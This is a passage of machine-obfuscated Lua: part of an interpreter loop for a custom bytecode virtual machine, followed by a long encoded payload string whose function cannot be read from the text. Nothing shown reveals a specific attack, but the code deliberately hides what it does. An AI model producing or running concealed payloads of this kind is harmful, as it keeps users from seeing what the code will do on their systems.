o;u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];o=w[28]u[o]=u[o](r(u,o+1,w[312]))end;elseif x<=28 then local o=w[28]u[o]=u[o](r(u,o+1,n))elseif x==29 then local o;u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];o=w[28]u[o]=u[o](r(u,o+1,w[312]))else u={};for o=0,q,1 do if o<j then u[o]=p[o+1];else break;end;end;k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]]+w[227];k=k+1;w=f[k];g[w[312]]=u[w[28]];k=k+1;w=f[k];do return end;k=k+1;w=f[k];do return end;end;elseif 35>=x then if x<=32 then if x>31 then local o=w[28];local v=u[o];for y=o+1,w[312]do t(v,u[y])end;else u={};for o=0,q,1 do if o<j then u[o]=p[o+1];else break;end;end;end;elseif 33>=x then local o;u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][u[w[227]]];k=k+1;w=f[k];o=w[28]u[o]=u[o](r(u,o+1,w[312]))elseif x<35 then a(c,e);else i[w[312]]=u[w[28]];end;elseif x<=38 then if 36>=x then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1~=a then c=nil else u[w[28]]=g[w[312]];end else if 3>a then k=k+1;else w=f[k];end end else if a<=5 then if a>4 then k=k+1;else u[w[28]]=w[312];end else if 7~=a then w=f[k];else u[w[28]]=w[312];end end end else if a<=11 then if a<=9 then if a~=9 then k=k+1;else w=f[k];end else if a>10 then k=k+1;else u[w[28]]=w[312];end end else if a<=13 then if a==12 then w=f[k];else c=w[28]end else if a>14 then break else u[c]=u[c](r(u,c+1,w[312]))end end end end a=a+1 end elseif x==37 then u[w[28]]=u[w[312]]+w[227];else i[w[312]]=u[w[28]];end;elseif x<=39 then u[w[28]]={r({},1,w[312])};elseif x~=41 then local a;u={};for c=0,q,1 do if c<j then u[c]=p[c+1];else break;end;end;k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][u[w[227]]];k=k+1;w=f[k];a=w[28]u[a](u[a+1])else local a;u={};for c=0,q,1 do if c<j then u[c]=p[c+1];else break;end;end;k=k+1;w=f[k];u[w[28]]={};k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]={};k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28];u[a]=u[a]-u[a+2];k=w[312];end;elseif 62>=x then if(51==x or 51>x)then if 46>=x then if(x<=43)then if not(x==43)then local a=w[28]local c={u[a](u[a+1])};local e=0;for o=a,w[227]do e=(e+1);u[o]=c[e];end else local a=w[28];u[a]=u[a]-u[a+2];k=w[312];end;elseif(x==44 or x<44)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0==a then c=nil else u[w[28]]=u[w[312]][w[227]];end else if 2==a then k=k+1;else w=f[k];end end else if a<=5 then if a<5 then u[w[28]]=u[w[312]];else k=k+1;end else if a<7 then w=f[k];else u[w[28]]=g[w[312]];end end end else if a<=11 then if a<=9 then if 8<a then w=f[k];else k=k+1;end else if a<11 then u[w[28]]=u[w[312]][w[227]];else k=k+1;end end else if a<=13 then if a>12 then c=w[28]else w=f[k];end else if 15~=a then u[c]=u[c](r(u,c+1,w[312]))else break end end end end a=a+1 end elseif not(x==46)then u[w[28]]=u[w[312]]/w[227];else if(u[w[28]]<u[w[227]])then k=(k+1);else k=w[312];end;end;elseif x<=48 then if not(47~=x)then local a=w[28];do return r(u,a,n)end;else u[w[28]]={};end;elseif(49>x or 49==x)then for a=w[28],w[312],1 do u[a]=nil;end;elseif 50==x then local a=w[28]u[a]=u[a](r(u,a+1,n))else local a=0 while true do if a<=6 then if a<=2 then if a<=0 then u={};else if 2>a then for c=0,q,1 do if c<j then u[c]=p[c+1];else break;end;end;else k=k+1;end end else if a<=4 then if 3<a then u[w[28]]=i[w[312]];else w=f[k];end else if a<6 then k=k+1;else w=f[k];end end end else if a<=10 then if a<=8 then if a<8 then u[w[28]]=u[w[312]];else k=k+1;end else if 10>a then w=f[k];else for c=w[28],w[312],1 do u[c]=nil;end;end end else if a<=12 then if a~=12 then k=k+1;else w=f[k];end else if 14>a then k=w[312];else break end end end end a=a+1 end end;elseif x<=56 then if 53>=x then if x<53 then u[w[28]]=(u[w[312]]-w[227]);else if(u[w[28]]~=u[w[227]])then k=w[312];else k=k+1;end;end;elseif(x<54 or x==54)then u[w[28]]=u[w[312]]%w[227];elseif(x<56)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a<1 then c=nil else u[w[28]]=g[w[312]];end else if 2==a then k=k+1;else w=f[k];end end else if a<=5 then if a==4 then u[w[28]]=w[312];else k=k+1;end else if a==6 then w=f[k];else u[w[28]]=w[312];end end end else if a<=11 then if a<=9 then if a==8 then k=k+1;else w=f[k];end else if 10<a then k=k+1;else u[w[28]]=w[312];end end else if a<=13 then if a~=13 then w=f[k];else c=w[28]end else if a~=15 then u[c]=u[c](r(u,c+1,w[312]))else break end end end end a=a+1 end else local a=w[28]u[a](r(u,(a+1),n))end;elseif(x<=59)then if x<=57 then u[w[28]]=u[w[312]]%u[w[227]];elseif x>58 then local a=w[28]u[a]=u[a](r(u,(a+1),w[312]))else local a=w[28]local c={}for e=1,#s do local o=s[e]for v=1,#o do local o=o[v]local v,v=o[1],o[2]if(v==a or v>a)then c[v]=u[v]o[1]=c s[e]=nil;end end end end;elseif(60>=x)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a>0 then u[w[28]]=u[w[312]];else c=nil end else if a<3 then k=k+1;else w=f[k];end end else if a<=5 then if 4==a then u[w[28]]=u[w[312]];else k=k+1;end else if a<7 then w=f[k];else u[w[28]]=u[w[312]];end end end else if a<=11 then if a<=9 then if a==8 then k=k+1;else w=f[k];end else if 11~=a then u[w[28]]=u[w[312]];else k=k+1;end end else if a<=13 then if a>12 then c=w[28]else w=f[k];end else if a~=15 then u[c]=u[c](r(u,c+1,w[312]))else break end end end end a=a+1 end elseif not(62==x)then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 0<a then u[w[28]]=u[w[312]][w[227]];else c=nil end else if 3~=a then k=k+1;else w=f[k];end end else if a<=5 then if a<5 then u[w[28]]=w[312];else k=k+1;end else if a>6 then u[w[28]]=g[w[312]];else w=f[k];end end end else if a<=11 then if a<=9 then if a~=9 then k=k+1;else w=f[k];end else if a<11 then u[w[28]]=u[w[312]][w[227]];else k=k+1;end end else if a<=13 then if 12==a then w=f[k];else c=w[28]end else if a>14 then break else u[c]=u[c](r(u,c+1,w[312]))end end end end a=a+1 end else u[w[28]]=(u[w[312]]*w[227]);end;elseif 72>=x then if x<=67 then if 64>=x then if x<64 then local a;u={};for c=0,q,1 do if c<j then u[c]=p[c+1];else break;end;end;k=k+1;w=f[k];u[w[28]]=false;k=k+1;w=f[k];u[w[28]]=i[w[312]];k=k+1;w=f[k];for c=w[28],w[312],1 do u[c]=nil;end;k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=u[w[312]];k=k+1;w=f[k];a=w[28]u[a]=u[a](u[a+1])else for a=w[28],w[312],1 do u[a]=nil;end;end;elseif x<=65 then u[w[28]]=i[w[312]];elseif x>66 then local a;u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][u[w[227]]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))else local a;u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))end;elseif x<=69 then if x~=69 then local a=w[28]local c={u[a](u[a+1])};local e=0;for o=a,w[227]do e=e+1;u[o]=c[e];end else local a;u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];a=w[28];do return u[a](r(u,a+1,w[312]))end;k=k+1;w=f[k];a=w[28];do return r(u,a,n)end;end;elseif x<=70 then local a=w[28];local c=w[227];local e=a+2;local o={u[a](u[a+1],u[e])};for v=1,c do u[e+v]=o[v];end local a=u[a+3];if a then u[e]=a;k=w[312];else k=k+1 end;elseif 72>x then local a;u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))else local a;u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))end;elseif 77>=x then if 74>=x then if x>73 then if not u[w[28]]then k=k+1;else k=w[312];end;else if(u[w[28]]~=u[w[227]])then k=k+1;else k=w[312];end;end;elseif x<=75 then local a=w[28]u[a]=u[a](u[a+1])elseif x~=77 then local a;u={};for c=0,q,1 do if c<j then u[c]=p[c+1];else break;end;end;k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=#u[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28];u[a]=u[a]-u[a+2];k=w[312];else if(u[w[28]]~=u[w[227]])then k=w[312];else k=k+1;end;end;elseif x<=80 then if 78>=x then local a=w[28]local c,e=h(u[a](r(u,a+1,w[312])))n=e+a-1 local e=0;for o=a,n do e=e+1;u[o]=c[e];end;elseif x<80 then if(u[w[28]]~=u[w[227]])then k=k+1;else k=w[312];end;else local a;u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))end;elseif x<=81 then u[w[28]]();elseif 82<x then local a=w[28];do return u[a](r(u,a+1,w[312]))end;else u[w[28]]=false;end;elseif 125>=x then if x<=104 then if 93>=x then if 88>=x then if x<=85 then if x>84 then local a=u[w[227]];if not a then k=k+1;else u[w[28]]=a;k=w[312];end;else local a;u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))end;elseif 86>=x then u[w[28]][u[w[312]]]=u[w[227]];elseif 87==x then u[w[28]]=u[w[312]]%u[w[227]];else local a;local c,e;local o;u[w[28]]=u[w[312]][u[w[227]]];k=k+1;w=f[k];u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];o=w[28]c,e=h(u[o](r(u,o+1,w[312])))n=e+o-1 a=0;for e=o,n do a=a+1;u[e]=c[a];end;end;elseif x<=90 then if x==89 then local a=w[28];local c=w[227];local e=a+2;local o={u[a](u[a+1],u[e])};for v=1,c do u[e+v]=o[v];end local a=u[a+3];if a then u[e]=a;k=w[312];else k=k+1 end;else u[w[28]]=u[w[312]]/w[227];k=k+1;w=f[k];u[w[28]]=u[w[312]]-u[w[227]];k=k+1;w=f[k];u[w[28]]=u[w[312]]/w[227];k=k+1;w=f[k];u[w[28]]=u[w[312]]*w[227];k=k+1;w=f[k];u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]];k=k+1;w=f[k];k=w[312];end;elseif 91>=x then local a=w[28]u[a](r(u,(a+1),w[312]))elseif 92==x then local a=w[28];local c=u[a];for e=a+1,w[312]do t(c,u[e])end;else local a;u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))end;elseif 98>=x then if x<=95 then if x~=95 then if(w[28]<u[w[227]])then k=k+1;else k=w[312];end;else if not u[w[28]]then k=k+1;else k=w[312];end;end;elseif x<=96 then u[w[28]]=w[312];elseif 97<x then u[w[28]]={r({},1,w[312])};else local a=u[w[28]]+w[227];u[w[28]]=a;if(a<=u[w[28]+1])then k=w[312];end;end;elseif x<=101 then if x<=99 then u[w[28]]=u[w[312]]+u[w[227]];elseif x>100 then u[w[28]]=b(d[w[312]],nil,i);else local a;u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))end;elseif x<=102 then do return u[w[28]]end elseif 104~=x then g[w[312]]=u[w[28]];else local a=w[28]u[a](r(u,a+1,w[312]))end;elseif x<=114 then if x<=109 then if 106>=x then if 105<x then k=w[312];else u[w[28]]=u[w[312]];end;elseif x<=107 then local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a>0 then u[w[28]]=u[w[312]];else c=nil end else if 2<a then w=f[k];else k=k+1;end end else if a<=5 then if a==4 then u[w[28]]=w[312];else k=k+1;end else if 7>a then w=f[k];else u[w[28]]=w[312];end end end else if a<=11 then if a<=9 then if a<9 then k=k+1;else w=f[k];end else if a~=11 then u[w[28]]=w[312];else k=k+1;end end else if a<=13 then if 12<a then c=w[28]else w=f[k];end else if a~=15 then u[c]=u[c](r(u,c+1,w[312]))else break end end end end a=a+1 end elseif x==108 then u[w[28]]=u[w[312]]*w[227];else local a=u[w[227]];if not a then k=k+1;else u[w[28]]=a;k=w[312];end;end;elseif 111>=x then if(x>110)then local a,c=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then u[w[28]]=u[w[312]][w[227]];else c=nil end else if a<=2 then k=k+1;else if 4~=a then w=f[k];else u[w[28]]=w[312];end end end else if a<=7 then if a<=5 then k=k+1;else if a<7 then w=f[k];else u[w[28]]=g[w[312]];end end else if a<=8 then k=k+1;else if 10>a then w=f[k];else u[w[28]]=u[w[312]][w[227]];end end end end else if a<=16 then if a<=13 then if a<=11 then k=k+1;else if a==12 then w=f[k];else c=w[28];end end else if a<=14 then do return u[c](r(u,c+1,w[312]))end;else if a<16 then k=k+1;else w=f[k];end end end else if a<=19 then if a<=17 then c=w[28];else if a>18 then k=k+1;else do return r(u,c,n)end;end end else if a<=20 then w=f[k];else if a~=22 then k=w[312];else break end end end end end a=a+1 end else u[w[28]]=true;end;elseif x<=112 then local a;u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][u[w[227]]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))elseif x==113 then local a=w[28]u[a]=u[a]()else local a=w[28];local c,e,o=u[a],u[a+1],u[a+2];local c=c+o;u[a]=c;if o>0 and c<=e or o<0 and c>=e then k=w[312];u[a+3]=c;end;end;elseif 119>=x then if x<=116 then if 115==x then u={};for a=0,q,1 do if a<j then u[a]=p[a+1];else break;end;end;k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]]+w[227];k=k+1;w=f[k];g[w[312]]=u[w[28]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]();else u[w[28]]=#u[w[312]];end;elseif 117>=x then local a=w[28];u[a]=u[a]-u[a+2];k=w[312];elseif x>118 then local a;u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))else u[w[28]]=w[312];end;elseif 122>=x then if(x<120 or x==120)then local a=w[28];do return u[a](r(u,a+1,w[312]))end;elseif(121==x)then if u[w[28]]then k=k+1;else k=w[312];end;else local a=0 while true do if a<=18 then if a<=8 then if a<=3 then if a<=1 then if 0==a then u[w[28]]=i[w[312]];else k=k+1;end else if a~=3 then w=f[k];else u[w[28]]=u[w[312]][w[227]];end end else if a<=5 then if 4<a then w=f[k];else k=k+1;end else if a<=6 then u[w[28]]=i[w[312]];else if 7<a then w=f[k];else k=k+1;end end end end else if a<=13 then if a<=10 then if 9==a then u[w[28]]=i[w[312]];else k=k+1;end else if a<=11 then w=f[k];else if a~=13 then u[w[28]]=i[w[312]];else k=k+1;end end end else if a<=15 then if 15~=a then w=f[k];else u[w[28]]=i[w[312]];end else if a<=16 then k=k+1;else if a==17 then w=f[k];else u[w[28]]=i[w[312]];end end end end end else if a<=27 then if a<=22 then if a<=20 then if 20>a then k=k+1;else w=f[k];end else if a>21 then k=k+1;else u[w[28]]=i[w[312]];end end else if a<=24 then if a>23 then u[w[28]]=i[w[312]];else w=f[k];end else if a<=25 then k=k+1;else if a>26 then u[w[28]]=i[w[312]];else w=f[k];end end end end else if a<=32 then if a<=29 then if a~=29 then k=k+1;else w=f[k];end else if a<=30 then u[w[28]]={};else if a==31 then k=k+1;else w=f[k];end end end else if a<=34 then if a<34 then u[w[28]]=u[w[312]][w[227]];else k=k+1;end else if a<=35 then w=f[k];else if 36==a then if not u[w[28]]then k=k+1;else k=w[312];end;else break end end end end end end a=a+1 end end;elseif 123>=x then u[w[28]][w[312]]=u[w[227]];elseif x<125 then u[w[28]]=u[w[312]];else local a;local c,e;local o;u[w[28]]=i[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];o=w[28]c,e=h(u[o](r(u,o+1,w[312])))n=e+o-1 a=0;for e=o,n do a=a+1;u[e]=c[a];end;end;elseif 146>=x then if 135>=x then if x<=130 then if x<=127 then if x>126 then local a=w[28]u[a]=u[a]()else u[w[28]]=#u[w[312]];end;elseif 128>=x then local a=w[28];local c,e,o=u[a],u[a+1],u[a+2];local c=c+o;u[a]=c;if o>0 and c<=e or o<0 and c>=e then k=w[312];u[a+3]=c;end;elseif x<130 then u[w[28]]=u[w[312]]-u[w[227]];else local a;u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))end;elseif 132>=x then if 131==x then if(u[w[28]]<u[w[227]])then k=k+1;else k=w[312];end;else local a=w[28];local c=u[a];for e=a+1,n do t(c,u[e])end;end;elseif x<=133 then do return end;elseif x>134 then local a;u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))else u[w[28]]=i[w[312]];end;elseif 140>=x then if x<=137 then if 137>x then g[w[312]]=u[w[28]];else local a=d[w[312]];local c={};local d={};for e=1,w[227]do k=(k+1);local o=f[k];if not(o[626]~=105)then d[e-1]={u,o[312],nil,nil,nil};else d[(e-1)]={g,o[312],nil};end;s[(#s+1)]=d;end;m(c,{['\95\95\105\110\100\101\120']=function(e,e)local e=d[e];return e[1][e[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(e,e,m)local d=d[e]d[1][d[2]]=m;end;});u[w[28]]=b(a,c,i);end;elseif 138>=x then local a=w[28]u[a](u[a+1])elseif 139<x then if(w[28]<=u[w[227]])then k=k+1;else k=w[312];end;else do return u[w[28]]end end;elseif 143>=x then if 141>=x then k=w[312];elseif 142==x then if(w[28]<=u[w[227]])then k=k+1;else k=w[312];end;else local a;u={};for c=0,q,1 do if c<j then u[c]=p[c+1];else break;end;end;k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][u[w[227]]];k=k+1;w=f[k];a=w[28]u[a](u[a+1])end;elseif 144>=x then u[w[28]]=u[w[312]]+w[227];elseif 145==x then u[w[28]]=u[w[312]]+u[w[227]];else local a=w[28];local c=u[w[312]];u[a+1]=c;u[a]=c[w[227]];end;elseif 157>=x then if x<=151 then if x<=148 then if 147<x then local a;u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))else local a=w[28]local c,d=h(u[a](r(u,a+1,w[312])))n=d+a-1 local d=0;for e=a,n do d=d+1;u[e]=c[d];end;end;elseif 149>=x then local a=w[28]u[a](u[a+1])elseif x<151 then if(u[w[28]]<=w[227])then k=k+1;else k=w[312];end;else u[w[28]][w[312]]=u[w[227]];end;elseif 154>=x then if 152>=x then u[w[28]]();elseif x==153 then if(w[28]<u[w[227]])then k=k+1;else k=w[312];end;else local a;local c;u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=i[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];k=k+1;w=f[k];c=w[28];a=u[c];for d=c+1,w[312]do t(a,u[d])end;end;elseif x<=155 then u[w[28]]=g[w[312]];elseif x>156 then local a=w[28];local c=u[w[312]];u[a+1]=c;u[a]=c[w[227]];else local a;u[w[28]]=u[w[312]]%u[w[227]];k=k+1;w=f[k];u[w[28]]=u[w[312]]+w[227];k=k+1;w=f[k];u[w[28]]=g[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))end;elseif x<=162 then if(x==159 or x<159)then if(159>x)then u={};for a=0,q,1 do if a<j then u[a]=p[(a+1)];else break;end;end;else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1~=a then c=nil else u[w[28]]=u[w[312]];end else if 2==a then k=k+1;else w=f[k];end end else if a<=5 then if 4==a then u[w[28]]=w[312];else k=k+1;end else if a~=7 then w=f[k];else u[w[28]]=w[312];end end end else if a<=11 then if a<=9 then if a<9 then k=k+1;else w=f[k];end else if a>10 then k=k+1;else u[w[28]]=w[312];end end else if a<=13 then if 13~=a then w=f[k];else c=w[28]end else if a<15 then u[c]=u[c](r(u,c+1,w[312]))else break end end end end a=a+1 end end;elseif(x==160 or x<160)then if(u[w[28]]<=w[227])then k=(k+1);else k=w[312];end;elseif(162>x)then u[w[28]]=u[w[312]]%w[227];else local a=w[28];local c=u[a];for d=a+1,n do t(c,u[d])end;end;elseif 165>=x then if x<=163 then u[w[28]]=u[w[312]]/w[227];elseif x>164 then local a;u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];a=w[28]u[a]=u[a](r(u,a+1,w[312]))else u[w[28]]=true;end;elseif 166>=x then u[w[28]]=(u[w[312]]-u[w[227]]);elseif x<168 then u[w[28]]=u[w[312]]-w[227];else local a;local c,d;local e;u[w[28]]=u[w[312]];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];e=w[28]c,d=h(u[e](r(u,e+1,w[312])))n=d+e-1 a=0;for d=e,n do a=a+1;u[d]=c[a];end;end;k=k+1;end;end;end;return b(cr(),{},l())();end)('24622L22B22L26Q25N27927A27B27925L25Q27A25725524I24L25B27E27A25B24Q24P24N24U25L25P27A24O24K24L24O24Q27L27U27925425B27I24L24S25L25R27V24J24Q25528927A24M28024J25L25L27A24K25427M27924V24U24P25A28828A27927O25424G25L25E27V24K25524K25A25B27J27S28W25N24T27J24V25L25O27A24S24U25B24T24U24L25927T27A25A24L25724Q24O29027F27925727Z24N24N29G29I29K27J24T24K28F2792A72A925J27A25429K24M29K28027P27R25L25K27A25524U2572AN2AF25A24P28P25N28H25B24O28J25F27N28N28527J28828225N27J2AG25527L29B24S2542AV25L25M27A23027C27924123V25L24J27A22Z25I21U1524W1O1426C22G25426I22C25F24Y1T25721S1222S25F1Z26O1Z22L1G24L26321G21421J22E23R1N22U21D2362602242451E25J23621322526P26D26X22G21P23Z24L21S1C26C25723323E2731P26525024B22N2191O25L23Q27025J26W25S25423926Q1621821A22325Y25O22024522K22F24323022X2581F21Z21O24P26D22Y25426Z1R23B24S23B22M24B26S22T2AA25N1724Z1Z2342BJ27A172EW27921K2EZ25N2DM2AO27921C23P1V2F22142F21D2AT27922624I22X2EQ1D24Z21822U25L24R27A1324Y21I23925F1Y21725N21626124D23E24K26322X25V21H22O1H24W21Y23M21S21E23I25T25A22I22K1P21H26G23E2212281O26I23J24H21N26O2221U21824B25M23U21I22326C25Y1Y23E23U25K151O24B23325226426G23421S23D24G26G25V26U25K24X23K1624M2381T21S21826R27223C26923023624H22K1Q23W21321H22N29H1625P24A25L2B327924424D23Y24924823M23O23P2AX24N24K25824U28E29B24423Y23P24D27B22322G1N1F23U2BN25N21N26S2EQ25828C2BE27A24V25A24M2AS29H2IG24429E24U24Z25L25D27A24424424L24U2582JM2JO2JJ25N2JS29U24I25528O2IF2K02JL2K22K429Q2JK24I25B2IT2JP2JR24425B2B528624S2J626U2BQ2JQ2792IQ24Q24V2842KL2EQ24S24Q2AI2A427923N25B25B25723W29K2J626T2BQ21V27A23U24N24Q25426F26J2KD26J24Q25725724U28D25426J25B2JC2LS24J24U2LV29524U2LR24K24T2LL24S27X24Y26J28C2592LX24P24U24T24Q2A229N26J2AI2LI24Q24L24V2LV2LX2AG24L25428024I27X2LR27W25A2K42B72LY29624S24J2MI2M72MC2N028D2LX2JM25424O27I24P2AL2M72JN2ND25A24O24I2MT28726D2FE25N2702NS21M2BK2792662J62NY2NZ26127B2NV25N2O125N2BK28L2792O528L2F525N26J27D25N2O825N29B25L26025N2OC2O924X2OI25N29Y2OD27928A29B2B92O527F2JZ2O527U2K62O529H2OS2O52B32922O92792922OC2O52JQ2KQ2O427925C25N2PJ2PA25N2AE2OH27A25I2NZ2OE25N25H25N2P92PN27A2822PV2642O62Q325R24H27A2Q22O72OL2PV2O326324W2PW2PY2792PV27925P2AE2PV28L2BK2NV24I2NZ27D2OL25G2OM2PZ2AE2632OQ2BK2F52QQ2792JZ27C2R225N2QU2J62R62PP27B26K25N2622PU2J62612252PH2PR2QJ2442PH26G2Q32BK2Q527A2RP2BK26J2922O12PX29B2RI25N2QA2PZ2RN2OL2RD2QO2OI2Q62792S72OD2922OL2PX2QI2SD25N2672QF2OU27A2S12NX2R82SI26525N2JZ2B92RW25N2Q22K62QY2RM2SX25N26D2RQ2S927A2T42RV2922SY27A2RF2O92RJ25V2PH27926J22925N25U2ST27A2OL2TI27925T2TN2792SK2TQ25N25S2TT25N2NX2TW25Z2TZ2U12TH25Y25N2SS2TW25X2SL2T22TW25W2TZ2TG27C2RF2UF2792O325N2RD2O12Q22J622C2S225N2T027C2O52SK2TM2PM2NX2TS2PM2SS2TY27C2OL2U92OG27B2532SJ2UU2RH2592U025N2U32O92VF2SS2V22O42VF2Q22V52UL2VC2UQ2V927A2VB2NX2UV27B2612VK25N2U72VJ2T22VM2W025N2TG2VQ2Q32NX2UH2VU2792VB2SS2VY2SN2